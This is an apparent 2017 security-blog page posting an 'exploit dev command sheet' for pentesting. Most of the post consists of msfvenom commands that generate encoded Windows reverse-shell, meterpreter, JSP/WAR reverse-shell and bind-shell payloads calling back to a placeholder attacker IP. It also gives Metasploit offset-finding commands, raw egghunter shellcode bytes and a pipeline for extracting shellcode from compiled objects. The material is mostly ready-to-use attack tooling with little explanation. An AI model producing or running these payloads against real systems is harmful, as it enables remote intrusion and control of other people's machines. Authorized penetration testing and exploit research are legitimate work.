<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Exploit Dev Command Sheet &middot; Greycel
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/lanyon.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class="theme-base-08 layout-reverse sidebar-overlay">

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>Keep Learning..</p>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="/">Home</a>

    

    
    
      
        
      
    
      
        
      
    
      
        
          <a class="sidebar-nav-item" href="/about/">About</a>
        
      
    
      
        
          <a class="sidebar-nav-item" href="/archive/">Archive</a>
        
      
    
      
    


<!--    <a class="sidebar-nav-item" href="/archive/v.zip">Archive/a> 
    <a class="sidebar-nav-item" href="">GitHub project</a> -->
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2017. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">Greycel</a>
            <small>Another Security Blog</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="post">
  <h1 class="post-title">Exploit Dev Command Sheet</h1>
  <span class="post-date">15 Apr 2017</span>
  <div class="message"> 
Hey, thought of adding few useful commands that I've been using frequently during pentest engagments and exploit developments.
</div>

<h3 id="metasploit-commands">Metasploit Commands</h3>
<ul>
  <li>MSF unique pattern</li>
</ul>

<blockquote>
  <p>Create new pattern to find the offset, useful during Exploit Dev.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">cd</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">tools</span><span class="o">/</span>
<span class="p">.</span><span class="o">/</span><span class="nx">pattern_create</span> <span class="o">-</span><span class="nx">l</span> <span class="mi">2000</span>
<span class="p">.</span><span class="o">/</span><span class="nx">pattern_offset</span> <span class="o">-</span><span class="nx">q</span> <span class="nx">PATTERN</span></code></pre></figure>

<ul>
  <li>MSFvenom</li>
</ul>

<blockquote>
  <p>Arch(-a), Platform(- -platform), Payload(-p), encoder(-e), 
Encode-Iteration(-i), Bad-chars(-b), Output Format(-f), OutPut-File(-o)</p>
</blockquote>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">payloads</span>
<span class="nx">msfvenom</span> <span class="o">--</span><span class="nx">help</span><span class="o">-</span><span class="nx">formats</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">x86</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">Windows</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=&lt;</span><span class="nx">UR</span> <span class="nx">IP</span><span class="o">&gt;</span> <span class="nx">LPORT</span><span class="o">=&lt;</span><span class="nx">PORT</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">x86</span><span class="o">/</span><span class="nx">shikata_ga_nai</span> <span class="o">-</span><span class="nx">b</span> <span class="s1">'\x00\x0a\x0d'</span> <span class="o">-</span><span class="nx">i</span> <span class="mi">2</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">python</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=&lt;</span><span class="nx">UR</span> <span class="nx">IP</span><span class="o">&gt;</span> <span class="nx">LPORT</span><span class="o">=&lt;</span><span class="nx">PORT</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">x86</span><span class="o">/</span><span class="nx">shikata_ga_nai</span>  <span class="o">-</span><span class="nx">b</span> <span class="s1">'\x00\x0a\x0d'</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">exe</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">myshell</span><span class="p">.</span><span class="nx">exe</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">java</span><span class="o">/</span><span class="nx">jsp_shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=&lt;</span><span class="nx">UR</span> <span class="nx">IP</span><span class="o">&gt;</span> <span class="nx">LPORT</span><span class="o">=&lt;</span><span class="nx">Port</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">raw</span> <span class="o">&gt;</span> <span class="nx">jspshell</span><span class="p">.</span><span class="nx">jsp</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">java</span><span class="o">/</span><span class="nx">jsp_shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=&lt;</span><span class="nx">UR</span> <span class="nx">IP</span><span class="o">&gt;</span> <span class="nx">LPORT</span><span class="o">=&lt;</span><span class="nx">Port</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">war</span> <span class="o">&gt;</span> <span class="nx">myshell</span><span class="p">.</span><span class="nx">war</span>

<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">shell_bind_tcp</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">4321</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">x86</span><span class="o">/</span><span class="nx">shikata_ga_nai</span> <span class="o">-</span><span class="nx">b</span> <span class="s2">"\x00\x0d\x0a"</span> <span class="o">-</span><span class="nx">i</span> <span class="mi">3</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">c</span></code></pre></figure>

<hr />

<ul>
  <li>EggHunter</li>
</ul>

<blockquote>
  <p>Basically this will loop through the memory and searches for the string “w00t”(\x77\x30\x30\x74). Once it finds the string or the egg “w00t” one after the other “w00tw00t” in memory, it will break out of the loop and continous to execute the shellcode placed immediatley after “w00tw00t”.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">Egg</span> <span class="s2">"w00t"</span> <span class="o">=</span> <span class="s2">"\x77\x30\x30\x74"</span> 

<span class="s2">"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"</span></code></pre></figure>

<hr />

<ul>
  <li>Compiling &amp; generate shellcode from binary</li>
</ul>

<blockquote>
  <p>Create a new assembly file like “myfile.nasm” and generate an object file by compiling the assembly file.
Then use “objdump” to extract the shellcode out from the generated object file “myobj.o”.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">nasm</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">elf32</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">myobj</span><span class="p">.</span><span class="nx">o</span> <span class="nx">myfile</span><span class="p">.</span><span class="nx">nasm</span>

<span class="nx">objdump</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">filename</span><span class="p">.</span><span class="nx">o</span><span class="o">|</span><span class="nx">grep</span> <span class="s1">'[0-9a-f]:'</span><span class="o">|</span><span class="nx">grep</span> <span class="o">-</span><span class="nx">v</span> <span class="s1">'file'</span><span class="o">|</span><span class="nx">cut</span> <span class="o">-</span><span class="nx">f2</span> <span class="o">-</span><span class="nx">d</span><span class="err">:</span><span class="o">|</span><span class="nx">cut</span> <span class="o">-</span><span class="nx">f1</span><span class="o">-</span><span class="mi">7</span> <span class="o">-</span><span class="nx">d</span><span class="s1">' '</span><span class="o">|</span><span class="nx">tr</span> <span class="o">-</span><span class="nx">s</span> <span class="s1">' '</span><span class="o">|</span><span class="nx">tr</span> <span class="s1">'\t'</span> <span class="s1">' '</span><span class="o">|</span><span class="nx">sed</span> <span class="s1">'s/ $//g'</span><span class="o">|</span><span class="nx">sed</span> <span class="s1">'s/ /\\x/g'</span><span class="o">|</span><span class="nx">paste</span> <span class="o">-</span><span class="nx">d</span> <span class="s1">''</span> <span class="o">-</span><span class="nx">s</span> <span class="o">|</span><span class="nx">sed</span> <span class="s1">'s/^/"/'</span><span class="o">|</span><span class="nx">sed</span> <span class="s1">'s/$/"/g'</span></code></pre></figure>

<hr />


</div>

<div class="related">
  <h2>Related Posts</h2>
  <ul class="related-posts">
    
  </ul>
</div>

      </div>
    </div>

    <label for="sidebar-checkbox" class="sidebar-toggle"></label>

    <script>
      (function(document) {
        var toggle = document.querySelector('.sidebar-toggle');
        var sidebar = document.querySelector('#sidebar');
        var checkbox = document.querySelector('#sidebar-checkbox');

        document.addEventListener('click', function(e) {
          var target = e.target;

          if(!checkbox.checked ||
             sidebar.contains(target) ||
             (target === checkbox || target === toggle)) return;

          checkbox.checked = false;
        }, false);
      })(document);
    </script>
  </body>
</html>
